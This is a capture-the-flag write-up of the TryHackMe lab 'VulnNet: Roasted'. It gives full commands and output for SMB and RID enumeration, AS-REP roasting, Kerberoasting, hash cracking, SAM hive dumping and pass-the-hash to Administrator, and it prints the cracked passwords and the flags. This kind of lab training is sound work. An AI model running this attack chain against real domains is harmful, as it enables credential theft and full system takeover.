| Category          | Details                                                       |
|-------------------|---------------------------------------------------------------|
| 📝 **Name**       | [VulnNet: Roasted](https://tryhackme.com/room/vulnnetroasted) |  
| 🏷 **Type**       | THM Challenge                                                 |
| 🖥 **OS**         | Windows                                                       |
| 🎯 **Difficulty** | Easy                                                          |
| 📁 **Tags**       | Rid bruteforce, AS-REP Roast, Kerberoast                      |

## Task 1: VulnNet: Roasted

### What is the user flag? (Desktop\user.txt)

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 16:46 +0100
Nmap scan report for 10.82.128.63
Host is up (0.040s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-29 15:50:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49819/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-29T15:51:17
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 323.93 seconds
```

#### Add `vulnnet-rst.local` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ echo "$TARGET vulnnet-rst.local" | sudo tee -a /etc/hosts
10.80.179.5 vulnnet-rst.local
```

#### Discover `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous` SMB shares
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ smbmap -u guest -p '' -H vulnnet-rst.local --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.81.176.76:445        Name: vulnnet-rst.local         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
[*] Closed 1 connections
```

#### `mount` both discovered SMB shares
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ mkdir VulnNet-Business-Anonymous && \
sudo mount -t cifs //$TARGET/VulnNet-Business-Anonymous VulnNet-Business-Anonymous -o username=guest,password='' && \
mkdir VulnNet-Enterprise-Anonymous && \
sudo mount -t cifs //$TARGET/VulnNet-Enterprise-Anonymous VulnNet-Enterprise-Anonymous -o username=guest,password=''
```

#### List files in both shares
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ tree VulnNet-Business-Anonymous && tree VulnNet-Enterprise-Anonymous 
VulnNet-Business-Anonymous
├── Business-Manager.txt
├── Business-Sections.txt
└── Business-Tracking.txt

1 directory, 3 files
VulnNet-Enterprise-Anonymous
├── Enterprise-Operations.txt
├── Enterprise-Safety.txt
└── Enterprise-Sync.txt

1 directory, 3 files
```
After getting content of those files with `cat VulnNet-Business-Anonymous/* && cat VulnNet-Enterprise-Anonymous/*` we could see that they contain information about 'company branches' and people 'in charge'. We could use this information to generate potential list of system users, however since `guest` account is available we will enumerate those users with RID bruteforce.

#### Enumerate users by bruteforcing RIDs using `guest` account
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ netexec smb vulnnet-rst.local -u guest -p '' --rid-brute 10000 --log rid-brute.txt
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

#### Prepare list of user for AS-REP Roasting
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ grep SidTypeUser rid-brute.txt | awk '{print $13}' | cut -d'\' -f2 | sort | uniq > users.txt && cat users.txt
Administrator
a-whitehat
enterprise-core-vn
Guest
j-goldenhand
j-leet
krbtgt
t-skid
WIN-2BO8M1OE1M1$
```

#### Perform AS-REP Roasting against prepared usernames
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -outputfile hashes.txt -format hashcat -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:0baf0859f344881f1b755a6a4ccdd4b6$f496086eb6bf108adda5c85d575f28a5ef1f1e998c78dd6e453876f7f78caa1af59b01610246f9e8b7af6051d64fdf9f6447c198a7f38432c38e704b373df6cfeb0e09181663d1a4154d1cdb37f0e1d3f6bdb605bf99e82e3ed3a6f43c04209dbad14744f326a97c251f3ce02e847ec6c91fcf50ce39249260b4a3a39d984bf05e7de5057d22e38c68aa6dc64b9e4dc7d707b860c4dea9383da27f279e306c4da31c901fc676245ba9b0a2bdbf92d4e4ca36336344116cd71ae472c7c99b9f22221b556b2072c10c18b637c9c87415d1aa4a0ead5e964a305bca7d783ea182269f2cbcc0765a2439efb38fae30f7159adc2fcfc59965
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

#### Crack password for `t-skid` account
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ hashcat -m 18200 --quiet hashes.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:2315689956d517f68b94a7707a3a36b0$2847b67b8806a6756c08f3db0a45107300e2a2e09ecb759cbc4bf981ab2e363c9e5c93a28c2b2e73f07f09591a659427fd3671d0f731a17a2bcff996cfd728ab4b9c431ec4b05bd52588c8fdd3fe2e5a75d4e42c9176a0a563dcf3f0db72a5f60a09c2dc2f6b078788233d3d0d22d217a16e0d1c63156faeb8b3e1e6e0a05dd2fc9b2acc37efb2dd3a38648db968ff71196c83ed76ae732eb1018e379c7c8a71ab7a25a576ff2d5772cba022a74df6ef4cf15620bf89c23f203ef9ffd4108d0278758efddd5eb46efca5ecd343572c6273faece178d36faab155e81358338392c8da3ef6ac96a567d18882be3bff96083912779ffdce:tj072889*
```

#### Perform Kerberoast using `t-skid` account
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ netexec ldap vulnnet-rst.local -u t-skid -p tj072889* --kerberoasting krb5tgs.hash
SMB         10.80.179.5     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
LDAP        10.80.179.5     389    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\t-skid:tj072889* 
LDAP        10.80.179.5     389    WIN-2BO8M1OE1M1  Bypassing disabled account krbtgt 
LDAP        10.80.179.5     389    WIN-2BO8M1OE1M1  [*] Total of records returned 1
LDAP        10.80.179.5     389    WIN-2BO8M1OE1M1  sAMAccountName: enterprise-core-vn memberOf: CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local pwdLastSet: 2021-03-11 20:45:09.913979 lastLogon:2021-03-14 00:41:17.987528
LDAP        10.80.179.5     389    WIN-2BO8M1OE1M1  $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$20efa7f40e7f2c33317d36f8cf28e7b3$2b7a161d0f521356409ce8cb4a7ef665a1fe3cd63a65e6d14d1f1b9fd673962c811521c22a4863d28e7d9adc56159b43a235dae6345e02de0d10c7f315457f26866d0a4d6133749a2625c2605184fde506914d5c00c91ab71bf92128413d16b421b2fb0f58767851a09433ffac7db057c8131174d069378b4de586eec64eacde95f344e871d1d662a43837e35937b4c2b504b99ad6781085ae5436d85c58139e5df4eb6823c3b33d260865bcb2aa8a9d6426efae696211affac44cdc4e0c3a0c28be3fc4b8ddfc1cf609a9c3934dfa88ea4a4a717c4a9c07c8262282f591af485515dc089ec3b7858472ebe0dce30299000d539d791420ffebd741367b0d2ac3c73aec0ffbb013137662af657e7aaa20c10e2fb9177653258cadf0fdb0f424665ed14115b750babaa23c4062e836fa81af052097d56bfd6b299f0cd3141fba7a6c92ba31a4df9a929ed32eecf2388e8ff747eb2eed06d9161a28f8da43ccaabe71e2d09a10b2db3072d9186a7d64fe268b4bad99e4fb0473c60ec6ddcaa58b26a0bdbcd731331c13aa06c29e16b2bf620a89c8db2085b294346d5ff91a0bef05420fba6728437ba9f4dfc8920ba3dd63b9b249db9fa6eaa6fee585d136999e9cbe521aa5ab3118d2075ddbbbbe2c5bec0d96b94a05fcd5007145a28ed6149fe922417c2b4b8e30d025dda2d445288fd3e253e16c86c70d0635af706a2c2495976731db0aa5d4989959803b7b8d5833a3bb53a21f217058e77541cc3276f9056a718631c5bf638f34aa2f976b1bcd33976694a3318c48c449e57e2cf3d45fc45ddc533347455a8efba5bc0b4b4b1155414077f4f5e10ae79fb00dbc0f5cff7d39bf77fbf97a4ab35edc17d6f8593234a67e71cef81e71b00e59145be50285fadb9b4b6d7a85fa1f9f5cad529272926ef6e96d71acae211fa00f996c13b17604d1a00d761b48252711b9b3d7d242beb787ccc14cd18cb1dff09048186fdedbc08147a6f9f68aaf14e6e70a08820af22ad2a1e63258a77592ca156cb34c8dc1ff04edaa4449da3f095859f385e1fbbe3884d1300cd5fd68db257b3e7db648ffa842d7558ed58a392d4ccd836c2c90542f3d29a3f0321f16c197a192a3f46e7b93dbb99fa010ccb3e41bf1b22c92ff1a4de891734b02f98f26dd908efd86a6153c3ec46f42d430928010a258040c852b5ebd80d58ea897d38ef11b309155381057328535e09be825d6ce89a52c33b65979a04288bbc6349bbfa5f712c7171ffbb0859bbf1b9bad8fa0d5722be803ccccdd6c8f2c65c5cd0779878eb5d3daeba7d3b775d2672cfe0113eaf577d061c68c417899581dae977d8de6c258b86f73d7fa7fdc1c4cb886da33bb24554a55b5513edd9a49b7e6c262b9f0f896679010
```

#### Crack password for `enterprise-core-vn` account
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ hashcat -m 13100 krb5tgs.hash /usr/share/wordlists/rockyou.txt --quiet
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$20efa7f40e7f2c33317d36f8cf28e7b3$2b7a161d0f521356409ce8cb4a7ef665a1fe3cd63a65e6d14d1f1b9fd673962c811521c22a4863d28e7d9adc56159b43a235dae6345e02de0d10c7f315457f26866d0a4d6133749a2625c2605184fde506914d5c00c91ab71bf92128413d16b421b2fb0f58767851a09433ffac7db057c8131174d069378b4de586eec64eacde95f344e871d1d662a43837e35937b4c2b504b99ad6781085ae5436d85c58139e5df4eb6823c3b33d260865bcb2aa8a9d6426efae696211affac44cdc4e0c3a0c28be3fc4b8ddfc1cf609a9c3934dfa88ea4a4a717c4a9c07c8262282f591af485515dc089ec3b7858472ebe0dce30299000d539d791420ffebd741367b0d2ac3c73aec0ffbb013137662af657e7aaa20c10e2fb9177653258cadf0fdb0f424665ed14115b750babaa23c4062e836fa81af052097d56bfd6b299f0cd3141fba7a6c92ba31a4df9a929ed32eecf2388e8ff747eb2eed06d9161a28f8da43ccaabe71e2d09a10b2db3072d9186a7d64fe268b4bad99e4fb0473c60ec6ddcaa58b26a0bdbcd731331c13aa06c29e16b2bf620a89c8db2085b294346d5ff91a0bef05420fba6728437ba9f4dfc8920ba3dd63b9b249db9fa6eaa6fee585d136999e9cbe521aa5ab3118d2075ddbbbbe2c5bec0d96b94a05fcd5007145a28ed6149fe922417c2b4b8e30d025dda2d445288fd3e253e16c86c70d0635af706a2c2495976731db0aa5d4989959803b7b8d5833a3bb53a21f217058e77541cc3276f9056a718631c5bf638f34aa2f976b1bcd33976694a3318c48c449e57e2cf3d45fc45ddc533347455a8efba5bc0b4b4b1155414077f4f5e10ae79fb00dbc0f5cff7d39bf77fbf97a4ab35edc17d6f8593234a67e71cef81e71b00e59145be50285fadb9b4b6d7a85fa1f9f5cad529272926ef6e96d71acae211fa00f996c13b17604d1a00d761b48252711b9b3d7d242beb787ccc14cd18cb1dff09048186fdedbc08147a6f9f68aaf14e6e70a08820af22ad2a1e63258a77592ca156cb34c8dc1ff04edaa4449da3f095859f385e1fbbe3884d1300cd5fd68db257b3e7db648ffa842d7558ed58a392d4ccd836c2c90542f3d29a3f0321f16c197a192a3f46e7b93dbb99fa010ccb3e41bf1b22c92ff1a4de891734b02f98f26dd908efd86a6153c3ec46f42d430928010a258040c852b5ebd80d58ea897d38ef11b309155381057328535e09be825d6ce89a52c33b65979a04288bbc6349bbfa5f712c7171ffbb0859bbf1b9bad8fa0d5722be803ccccdd6c8f2c65c5cd0779878eb5d3daeba7d3b775d2672cfe0113eaf577d061c68c417899581dae977d8de6c258b86f73d7fa7fdc1c4cb886da33bb24554a55b5513edd9a49b7e6c262b9f0f896679010:ry=ibfkfv,s6h,
```

#### Use `enterprise-core-vn` to gain foothold
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ evil-winrm-py -i vulnnet-rst.local -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'vulnnet-rst.local:5985' as 'enterprise-core-vn'
evil-winrm-py PS C:\Users\enterprise-core-vn\Documents>
```

#### Capture user flag
```
evil-winrm-py PS C:\Users\enterprise-core-vn\Documents> cat C:\Users\enterprise-core-vn\Desktop\user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

### What is the system flag? (Desktop\system.txt)

#### Map SMB shares using `enterprise-core-vn` account 
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ smbmap -u enterprise-core-vn -p 'ry=ibfkfv,s6h,' -H vulnnet-rst.local --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.81.176.76:445        Name: vulnnet-rst.local         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
[*] Closed 1 connections
```
We can see it has read access to `NETLOGON` and `SYSVOL` shares.

#### Mount both `NETLOGON` and `SYSVOL`
Since password for `enterprise-core-vn` account contains commas (`ry=ibfkfv,s6h`) it's hard to inline it in `mount` parameters. By omitting `password` we will be prompted for it.
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ mkdir NETLOGON && \
sudo mount -t cifs //$TARGET/NETLOGON $PWD/NETLOGON -o username=enterprise-core-vn && \
mkdir SYSVOL && \
sudo mount -t cifs //$TARGET/SYSVOL SYSVOL -o username=enterprise-core-vn
Password for enterprise-core-vn@//10.81.187.54/NETLOGON: 
Password for enterprise-core-vn@//10.81.187.54/SYSVOL: 
```

#### Discover `ResetPassword.vbs` in `NETLOGON`
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ tree NETLOGON && tree SYSVOL
NETLOGON
└── ResetPassword.vbs

1 directory, 1 file
SYSVOL
└── vulnnet-rst.local  [error opening dir]

2 directories, 0 files
```

#### Discover plaintext credentials for `a-whitehat` account in `ResetPassword.vbs`
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ cat -n NETLOGON/ResetPassword.vbs
    17  strUserNTName = "a-whitehat"
    18  strPassword = "bNdKVkjv3RR9ht"
```

#### Gain access using `a-whitehat` account
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ evil-winrm-py -i vulnnet-rst.local -u a-whitehat -p 'bNdKVkjv3RR9ht'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'vulnnet-rst.local:5985' as 'a-whitehat'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\a-whitehat\Documents> whoami /all
<SNIP>             
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
<SNIP>
```
Since `a-whitehat` is member of `BUILTIN\Administrators` at this stage system is compromised.

#### Dump and exfiltrate `SAM` and `SYSTEM` registry hives
```
evil-winrm-py PS C:\Users\a-whitehat\Documents> reg save HKLM\SAM SAM
The operation completed successfully.
evil-winrm-py PS C:\Users\a-whitehat\Documents> reg save HKLM\SYSTEM SYSTEM
The operation completed successfully.
evil-winrm-py PS C:\Users\a-whitehat\Documents> download SAM .
Downloading C:\Users\a-whitehat\Documents\SAM: 64.0kB [00:00, 217MB/s]                                                                                                                              
[+] File downloaded successfully and saved as: /home/magicrc/attack/THM VulnNet: Roasted/SAM
evil-winrm-py PS C:\Users\a-whitehat\Documents> download SYSTEM .
Downloading C:\Users\a-whitehat\Documents\SYSTEM: 15.7MB [00:10, 1.55MB/s]                                                                                                                          
[+] File downloaded successfully and saved as: /home/magicrc/attack/THM VulnNet: Roasted/SYSTEM
```

#### Use `impacket-secretsdump` to retrieve `Administrator` NTLM hash
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

#### Gain access as `Administrator` user using NTLM hash
```
┌──(magicrc㉿perun)-[~/attack/THM VulnNet: Roasted]
└─$ evil-winrm-py -i vulnnet-rst.local -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'vulnnet-rst.local:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
vulnnet-rst\administrator
```

#### Capture system flag
```
evil-winrm-py PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
```
